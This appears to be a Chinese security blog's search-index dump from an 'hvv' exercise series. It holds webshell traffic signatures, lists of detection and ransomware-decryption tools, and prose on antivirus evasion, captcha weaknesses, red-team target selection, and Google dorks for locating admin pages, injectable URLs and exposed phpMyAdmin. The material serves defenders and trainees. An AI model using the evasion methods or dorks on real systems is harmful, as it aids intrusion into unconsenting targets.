还有一段以QG开头，7J结尾的固定代码。 中国菜刀2011版本及2014版本各语言WebShell链接流量特征 (1) PHP类WebShell链接流量 其中特征主要在body中，将body中流量进行url解码后如下： 其中特征点有如下三部分， 第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的； 第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测； 第三：\u0026z0=QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。 注： 1.有少数时候eval方法会被assert方法替代。 2.$_POST也会被$_GET、$_REQUEST替代。 3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。 (2) JSP类WebShell链接流量： 该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A\u0026z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=参数用来加入攻击载荷。 注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。 (3) ASP类WebShell链接流量： 其中body流量进行URL解码后 其中特征点有如下三部分， 第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数； 第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。 第三：Response.Write和Response.End是必有的，是来完善整个操作的。 这种流量主要识别这几部分特征，在正常流量中基本没有。 注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。 中国菜刀2016版本各语言WebShell链接流量特征： (1) PHP类WebShell链接流量： 其中特征主要在body中，将body中部分如下： 这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。 其中特征点有如下三部分， 第一：““Ba”.“SE6”.“4_dEc”.“OdE”，这部分是将base64解码打断使用.来连接。 第二：@ev”.“al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。 第三：QGluaV9zZXQoImRpc3BsYXlf…，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。 注：有少数时候eval方法会被assert方法替代。 (2) JSP类WebShell链接流量： 该版本JSPwebshell流量与之前版本一样， 所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A\u0026z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。 注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。 (3) ASP类WebShell链接流量： 其中body流量为： 2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。 或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。 这种流量主要识别这几部分特征，在正常流量中基本没有。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#菜刀"},{"categories":["hvv"],"content":"\r蚁剑可以对流量进行加密、混淆，但有些关键代码没有被加密，如：PHP中的ini_set；ASP中的OnError，response 加密后后的数据包里面的参数大多都是_0x开头 payload用base64进行编码，数据包存在base加密的eval命令执行，数据包的payload内容存在几个分段内容，分别都使用base加密 （1）蚁剑PHP类WebShell链接流量 其中body流量进行URL解码后为： 其中流量最中明显的特征为@ini_set(“display_errors”,“0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。 （2）蚁剑ASP类WebShell链接流量 其中body流量进行URL解码后为： 我们可以看出蚁剑针对ASP类的WebShell流量与菜刀的流量很像，其中特征也是相同，如OnError ResumeNext、Response.End、Response.Write，其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex”\u0026cHr(101)\u0026“cute，同时该流量中也使用了eval参数，可以被认为明显特征。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#蚁剑"},{"categories":["hvv"],"content":"\r冰蝎 3.0一款动态二进制加密网站管理客户端。主要用于配合服务端shell的动态二进制加密通信，适用于WAF拦截回显等场景，客户端的流量无法检测 最大特点是交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成,因此该客户端的流量几乎无法检测 功能比较全，webshell本体容易被查杀，需要做webshell本体的免杀 请求数据包中的content-type字段常见为application/octet-stream； PHP代码中可能存在eval、assert等关键词； jsp代码中可能会有get class(),get class loader()等字符特征 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#冰蝎-30"},{"categories":["hvv"],"content":"\r冰蝎 4.0增加了webshell生成功能，可以完全自定义流量加密方法，对流量加密的灵活性又大大增加 内置10个user-agent ,每次连接shell时会随机选择一个进行使用. 冰蝎4.0建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右 冰蝎通讯默认使用长连接，请求头和响应头里会带有 Connection且Connection为 Keep-Alive Accep和Content-Type为弱特征且Content-type:一般为Application/x-www-form-urlencoded，这里可作为辅助特征 有固定的请求头和响应头： 请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M 响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#冰蝎-40"},{"categories":["hvv"],"content":"\r哥斯拉是基于流量、HTTP全加密的webshell工具 全部类型的shell 能绕过市面所有静态查杀 哥斯拉流量加密能绕过市面全部流量waf user-agent,如果不修改的话会返回使用的jdk信息 在请求包的Cookie中有一个非常致命的特征是会在最后出现分号 请求Accept和响应中Cache-Control字段（辅助认证） 响应包中的数据前16位为MD5+base64+后16位为MD5。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#哥斯拉"},{"categories":["hvv"],"content":"\rWeevely信息 payload 放于 accetp 头中，采用 gzip 压缩传输，使用异或加密。进行 base64 加密 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#weevely"},{"categories":["hvv"],"content":"\rWebshell查杀工具","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#webshell查杀工具"},{"categories":["hvv"],"content":"\rD盾： http://www.d99net.net ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#d盾"},{"categories":["hvv"],"content":"\r百度WEBDIR+ https://scanner.baidu.com ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#百度webdir"},{"categories":["hvv"],"content":"\r河马 https://www.shellpub.com ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#河马"},{"categories":["hvv"],"content":"\rWeb Shell Detector http://www.shelldetector.com ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#web-shell-detector"},{"categories":["hvv"],"content":"\rCloudWalker(牧云) https://webshellchop.chaitin.cn ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#cloudwalker牧云"},{"categories":["hvv"],"content":"\r深度学习模型检测PHP Webshell http://webshell.cdxy.me ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#深度学习模型检测php-webshell"},{"categories":["hvv"],"content":"\rPHP Malware Finder https://github.com/jvoisin/php-malware-finder ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#php-malware-finder"},{"categories":["hvv"],"content":"\rfindWebshell https://github.com/he1m4n6a/findWebshell ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:8","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#findwebshell"},{"categories":["hvv"],"content":"\r在线Webshell查杀工具 http://tools.bugscaner.com/killwebshell ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:9","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#在线webshell查杀工具"},{"categories":["hvv"],"content":"\rRootkit查杀chkrootkit 网址：http://www.chkrootkit.org rkhunter http://rkhunter.sourceforge.net ","date":"2023-11-17","objectID":"/hvv_emergency_response/:8:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#rootkit查杀"},{"categories":["hvv"],"content":"\r病毒查杀Clamav ClamAV的官方下载地址为：http://www.clamav.net/download.html ","date":"2023-11-17","objectID":"/hvv_emergency_response/:9:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#病毒查杀"},{"categories":["hvv"],"content":"\r如何发现隐藏的Webshell后门那么多代码里不可能我们一点点去找后门，另外，即使最好的Webshell查杀软件也不可能完全检测出来所有的后门，这个时候我们可以通过检测文件的完整性来寻找代码中隐藏的后门。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#如何发现隐藏的webshell后门"},{"categories":["hvv"],"content":"\r文件MD5校验绝大部分软件，我们下载时都会有MD5文件，这个文件就是软件开发者通过md5算法计算出该如软件的“特征值”，下载下来后，我们可以对比md5的值，如果一样则表明这个软件是安全的，如果不一样则反之。 Linux中有一个命令：md5sum可以查看文件的md5值，同理，Windows也有命令或者工具可以查看文件的md5值 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#文件md5校验"},{"categories":["hvv"],"content":"\rDiff命令 Linux中的命令，可以查看两个文本文件的差异 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#diff命令"},{"categories":["hvv"],"content":"\r文件对比工具 Beyond Compare WinMerge ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#文件对比工具"},{"categories":["hvv"],"content":"\r勒索病毒","date":"2023-11-17","objectID":"/hvv_emergency_response/:11:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#勒索病毒"},{"categories":["hvv"],"content":"\r勒索病毒搜索引擎 360：http://lesuobingdu.360.cn 腾讯：https://guanjia.qq.com/pr/ls 启明：https://lesuo.venuseye.com.cn 奇安信：https://lesuobingdu.qianxin.com 深信服：https://edr.sangfor.com.cn/#/information/ransom_search ","date":"2023-11-17","objectID":"/hvv_emergency_response/:11:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#勒索病毒搜索引擎"},{"categories":["hvv"],"content":"\r勒索软件解密工具集 腾讯哈勃：https://habo.qq.com/tool 金山毒霸：http://www.duba.net/dbt/wannacry.html 火绒：http://bbs.huorong.cn/forum-55-1.html 瑞星：http://it.rising.com.cn/fanglesuo/index.html Nomoreransom：https://www.nomoreransom.org/zh/index.html MalwareHunterTeam：https://id-ransomware.malwarehunterteam.com 卡巴斯基：https://noransom.kaspersky.com Avast：https://www.avast.com/zh-cn/ransomware-decryption-tools Emsisoft：https://www.emsisoft.com/ransomware-decryption-tools/free-download Github勒索病毒解密工具收集汇总：https://github.com/jiansiting/Decryption-Tools ","date":"2023-11-17","objectID":"/hvv_emergency_response/:11:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#勒索软件解密工具集"},{"categories":["hvv"],"content":"\r免杀，病毒分析免杀的话主要分为两种,一种是静态文件免杀,另一种是动态行为免杀 也有些师傅喜欢分为 二进制免杀(无源码),只能通过修改asm代码 二进制数据 其他数据来完成免杀 有源码的免杀,可以通过修改源代码来完成免杀,也可以结合二进制免杀的技术 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#免杀病毒分析"},{"categories":["hvv"],"content":"\r静态文件免杀a.特征码识别(病毒库在本地,模糊哈希匹配 b.云查杀(病毒库在云服务器 c.校验和法(本质还是特征码) d.启发式扫描,通过机械学系把家族病毒特征归纳,聚类 MYCCL查找特征码修改 找到杀软查杀的特征码，修改，替换，编码等等在不影响程序运行的情况下，把特征码改的面目全非，删掉也可以 加花指令 这是最有效也是最常用的方式，要点在于如何加话指令 对shellcode进行加密编码 比如在特定位置添加垃圾字符, 用硬编码的单字节密钥对字节进行异或加减法运算 把字节移位某些特定位置 交换连字节 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#静态文件免杀"},{"categories":["hvv"],"content":"\r动态行为免杀某些敏感操作监控 注册表 组策略 防火墙 敏感程序 各种win32api 文件夹 绕过方法的话就是 白加黑 让win的一些白文件去执行敏感操作 替换/找未导出的/重写/寻找底层api 替换调用顺序 通过调用其它进行功能来完成 API 的功能 比较经典的如，通过 rundll32.exe 来完成 dll 加载，通过 COM 来操作文件等等。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#动态行为免杀"},{"categories":["hvv"],"content":"\r分离免杀 shellcode从文本提取 shellcode与加载器分离 远程加载shellcode（shellcode放在另一台主机上，走http协议下载） 管道运输 隐写在图片上，powershell加载 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#分离免杀"},{"categories":["hvv"],"content":"\r网站验证码利用点","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#网站验证码利用点"},{"categories":["hvv"],"content":"\r验证码无效有验证码模块,但是验证模块与业务功能没有关联性,此为无效验证,无论输入什么都正确 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码无效"},{"categories":["hvv"],"content":"\r验证码由客户端生成 验证验证码由客户端js生成并且仅仅在客户端用js验证,通过抓包查看是否有验证码字段或者是关闭js看能否通过验证. ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码由客户端生成-验证"},{"categories":["hvv"],"content":"\r验证码有回显验证码在html或者cookie中显示,或者输出到response headers的其他字段,可被直接查看 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码有回显"},{"categories":["hvv"],"content":"\r验证码固定也叫验证码重复使用,是指验证码没有设置使用期限,在验证码首次认证成功后没有删除在session中的验证码,使得验证码可以被多次成功验证,从而造成危害. ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码固定"},{"categories":["hvv"],"content":"\r验证码可以爆破服务端未对验证时间 次数做出限制,存在爆破的可能性,简单的系统存在可以直接爆破的可能性,但是做过一些防护的系统还得进行一些绕过才能进行爆破 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码可以爆破"},{"categories":["hvv"],"content":"\r验证码可猜解验证码比较简单,可以通过推测猜到有哪些验证吗 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码可猜解"},{"categories":["hvv"],"content":"\r可绕过","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#可绕过"},{"categories":["hvv"],"content":"\r图片验证吗burpsuite插件推荐： xp_captcha：https://github.com/smxiazi/NEW_xp_CAPTCHA\rcaptcha-kiler：https://github.com/c0ny1/captcha-killer/tags\rreCAPTCHA：https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0\r","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:8","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#图片验证吗"},{"categories":["hvv"],"content":"\r短信验证码","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#短信验证码"},{"categories":["hvv"],"content":"\r短信轰炸没有对发送短信验证码的发送时间 用户 ip做出限制 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#短信轰炸"},{"categories":["hvv"],"content":"\r任意用户密码重置https://blog.csdn.net/m0_47418965/article/details/121613640 https://www.freebuf.com/vuls/253833.html ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#任意用户密码重置"},{"categories":["hvv"],"content":"\rhvv日记：https://blog.csdn.net/m0_61101264/article/details/130811974?spm=1001.2101.3001.6650.9\u0026utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-9-130811974-blog-131134229.235%5Ev38%5Epc_relevant_anti_vip_base\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-9-130811974-blog-131134229.235%5Ev38%5Epc_relevant_anti_vip_base\u0026utm_relevant_index=10 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#hvv日记"},{"categories":["hvv"],"content":"\r参考资料：REEBUF《应急响应1入侵排查篇》 CN-SEC《【2022HVV系列】|7-Windows主机入侵痕迹排查办法》 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#参考资料"},{"categories":["hvv"],"content":"HVV专题–渗透实战项目案例 【渗透实战系列】|44-记一次授权渗透实战（过程曲折，Java getshell） 【渗透实战系列】|31-记一次对学校的渗透测试 【渗透实战系列】26|一记某cms审计过程(步骤详细) 渗透系列之打击彩票站 【渗透实战系列】｜13-waf绕过拿下赌博网站 一次攻防演练的实战分享 实战 | 记一次攻防演练中的溯源经历 记一次挖矿linux挖矿木马应急分析排查处置过程 ","date":"2023-11-17","objectID":"/hvv_penetration_testing/:0:0","series":null,"tags":["hvv"],"title":"hvv_渗透实战项目","uri":"/hvv_penetration_testing/#"},{"categories":["hvv"],"content":"HVV专题–红队外围打点 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:0:0","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#"},{"categories":["hvv"],"content":"\r红队概述：\r","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:0","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#红队概述"},{"categories":["hvv"],"content":"\r信息收集方式：一般采取以下几种方式在搜索引擎（如：baidu、google）进行搜索： 主站相关联的链接，主站链接下可能会放置跳转，如邮件、OA等相关系统。 主站子域名进行搜索，通过二级或三级域名进行目标搜索相关域名。 主目标相关title，主要为搜索一些没有设置域名只有相关IP的系统。 主目标相关body，这种搜索方式误报率比较高，通过一些条件可筛选出相关联系统。 C段探测，一般前几种搜索方式获取相关IP，然后探测可能存在的C段，可获取一些没有相关联信息的隐藏资产。 端口探测，扫描是否存在其他的web服务，或可利用的、可爆破的、未授权的端口等。 邮件账号收集，一般为发布在公网上招聘、联系方式等，然后可进行弱密码破解。 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:1","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#信息收集方式"},{"categories":["hvv"],"content":"\r主要进攻目标原则: 资产范围比较庞大。因为资产范围广，容易出现不被关注的系统，安全性可能存在疏忽，比较容易进行突破； 受关注比较低的。由于受到关注度高的系统，如果受到攻击，影响会比较大，安全性会比一般的高。所以需要选择受关注比较低的系统做为突破口； 没有与资金直接关系的系统。涉及资金交易的系统，安全性受到重视度最高，突破难度大，所以不选择； 安全管理不够完善的单位。安全管理不够完善的单位做为突破口，容易发现弱口令或密码相同，人员安全意识不高，容易利用钓鱼手段做为突破口； ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:2","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#主要进攻目标原则"},{"categories":["hvv"],"content":"\r三个阶段：第一阶段 定位好主要攻击目标后，一起寻找主要突破口，当成功撕开一个突破口后进入第二阶段； 第二阶段 由于刚撕开突破口，不宜动作太大，所以由主要攻击手进行内网探测信息收集，以及留后门工作，寻找其他跳板机；另外两人进行次要目标的寻求突破，当主攻手成功获取其他跳板机后，或者次要目标找到突破口进入第三阶段； 第三阶段 全力挖掘内网，尽量得分，寻求拿下任务目标系统。 攻击手段 主要是通过以下途径开展渗透攻击：一是通过SQL注入、文件上传漏洞等攻击方式，对目标系统开展攻击，获取系统权限；二是利用后台、用户弱口令漏洞，获取网络及信息系统关键信息；三是利用系统已知漏洞，直接获得系统服务器权限。 当攻陷的服务器处于内网之中，将进一步深入进行内网漫游。 由于不同目标防守方一般经过行业划分，所以防守实力强弱差距比较大。 防守方最强的为金融行业，毕竟与金钱有着直接关系的，受到关注度也是最高，安全投入最高，就算突破也很难获取大量得分，所以大多数攻方都不以金融行业为主要攻击目标。 其次防守比较强的行业为重要企业，由于企业对外网络服务的业务少，受众面不如政府、金融行业，再加上企业对安全管理比较重视，所以企业属于易守难攻类型。 防守比较薄弱的几个行业如下： 运输交通、政府公众服务类、能源矿产类、电力等这几类系统的特点： 资产庞大，业务系统驳杂、全国各地都有甚至到县城，容易被找到突破口。 没有统一的安全管理，由于庞大系统需要多个管理员一起维护，一旦有重大漏洞爆出往往会出现响应不及时的现象。例如：在互联网上传播最新漏洞信息，防守比较强的行业能在第一时间内修复漏洞或者找到临时应对的方法。而防守薄弱的可能，没有获取相关信息，或者在了解信息后，没有比较好的解决方法选择极端的防守方式关闭站点。 安全边界防护不严格，由于系统庞大系统需要布满全国各地，地方可能也会开放自己的业务系统，一旦一个地方被入侵成功，就可连通全国各地的内网，以点破面全部沦陷的风险。 排查攻击能力较弱。 例如：在内网中发现攻击或木马后门，防守强的行业能在发现后门后，分析出攻击的入侵点，并能锁定哪些资产可能被入侵进行彻底排查。而防守比较弱的队伍可能无法发现后门，或者无法彻底清除后门，导致在管理以为彻底修复问题后，内网仍然被入侵。 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:3","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#三个阶段"},{"categories":["hvv"],"content":"\r正题：","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:0","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#正题"},{"categories":["hvv"],"content":"\r0x01 信息收集踩点 a b c 自动对词进行拆分匹配 拆分标准 空格 “a b c “ 把a b c 当成一个整体去查 ” a*b” *通配符 里面是一个或者多个 以a开头 b结尾 “ab” -c 找到ab 不包含c a and b 包含a和b “ab”(c|d) ab中可能包含c或者d intitle: xx 找标题 intext: xx 找内容 info: xx 搜索到关于一个URL的更多信息的页面列表，这里的信息包括这个网页的cache，还有与这个网页相似的网页等等 inurl: *.baidu.com 模糊搜索地址 inurl:phpmyadmin/index.php \u0026 (intext:username \u0026 password \u0026 “Welcome to”) inanchor:修改密码 锚点描述文本 filetype:pdf 搜索 cache:baidu.com 快照 历史信息 link:xxx.com 搜索所有链接有xxx.com 链接 site:*.baidu.com 搜索这个所有域名 related: xx.com 搜索相关网站 book: Lisa+CA phone电话簿查询美国街道地址和电话号码信息。例如 “phonebook:Lisa+CA”将查询名字里面包含”Lisa” 并住在加州的人的所有名字。 allinanchor 限制搜索结果必须是那些在anchor文字里包含了我们所有查询关键词的网页。 allintext 限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。 allintitle 限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。 allinurl 限制搜索结果仅是那些在URL（网址）里边包含了我们所有查询关键词的网页。 author 限制返回结果仅仅是那些在Google论坛里边，包含了特定作者的新闻文章。 bphonebook 用bphonebook进行查询的时候，返回结果将是那些商务电话资料。 datarange 将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被google收录的时间算的。 define 返回包含查询关键词定义的网面。 ext 用于filetype:查找扩散名为ext的文件。 group 限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。 id 又是一个没有证实的语法，效果很一般。 insubject 限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。 location 当我们提交location进行Google新闻查询的时候，Google仅会返回你当前指定区的跟查询关键词相关的网页。 movie 用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。 phonebook 用phonebook进行查询的时候，Google会返回美国当地跟查询关键词相关的电话信息。 related 用related提交查询，Google会返回跟我们要查询的网站结构内容相似的一些其它网站。 rphonebook 查询用来搜索美国当地跟查询关键词相关的住宅电话信息。 safesearch 用safesearch提交查询的时候，Google会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。 source 用source提交查询的时候，Google新闻会限制我们的查询仅是那些我们指定了特定ID或新闻源的网址。 stocks 返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。 store 查询的时候，Google Froogle仅会显示我们指定了store ID的结果。 tq 如果想查某个地方的天气如何,我们只要在Google搜索框中输入”城市名称 Tq”就可以查询到这个城市的天状况.例”北京 tq”,当然tq也可以用汉字的天气代替。 weather 用weather提交查询的时候，如果我们指出一个Google可以识别的地区或城市，Google会返回该地区或城市当前的天气状况。 Related:URL 搜索结果将展示与这个URL链接页面相关的页面。”相关”除了和该页面内容相关的页面外，还包括这个页面的导入链接和导出链接所指向的页面。 Ext “Ext:文件后缀”。它可以帮你搜索各种后缀格式的文件。比如说： xls (微软 Excel) ppt (微软 PowerPoint) doc (微软 Word) pdf (Adobe 文件) html or htm (HTML代码文件) Inanchor 搜索结果中必须出现以这个关键词为链接关键词的链接。 谷歌常用搜索语法： AND：缺一不可 OR：两者皆可 \"\"：为一个关键词 -：不包含某关键词 +：不忽略某关键词 “~”：同义词匹配搜索 “?”和“*”：占位通配符 关键字搜索 site：指定域名，如：site:edu.cn 搜索教育网站 inurl：用于搜索包含的url关键词的网页，如：inurl:login 搜索网址中含有login的网页 intitle：搜索网页标题中的关键字，如：intitle:“index of /admin” intext：搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码 filetype：按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp 查找后台 site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user 查找sql注入漏洞 inurl:.php?id=23 公司 inurl:.asp?id=11 查找上传点： site:xx.com inurl:file| uploadfile 查找敏感信息泄露 intitle:\"Index of /admin\" intitle:\"Index of /root\" intitle:\"Index of /\" +password.txt intitle:phpinfo()或者inurl:phpinfo.php 查找未授权访问phpmyadmin inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:1","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x01-信息收集踩点"},{"categories":["hvv"],"content":"\r0x01 信息收集踩点 a b c 自动对词进行拆分匹配 拆分标准 空格 “a b c “ 把a b c 当成一个整体去查 ” a*b” *通配符 里面是一个或者多个 以a开头 b结尾 “ab” -c 找到ab 不包含c a and b 包含a和b “ab”(c|d) ab中可能包含c或者d intitle: xx 找标题 intext: xx 找内容 info: xx 搜索到关于一个URL的更多信息的页面列表，这里的信息包括这个网页的cache，还有与这个网页相似的网页等等 inurl: *.baidu.com 模糊搜索地址 inurl:phpmyadmin/index.php \u0026 (intext:username \u0026 password \u0026 “Welcome to”) inanchor:修改密码 锚点描述文本 filetype:pdf 搜索 cache:baidu.com 快照 历史信息 link:xxx.com 搜索所有链接有xxx.com 链接 site:*.baidu.com 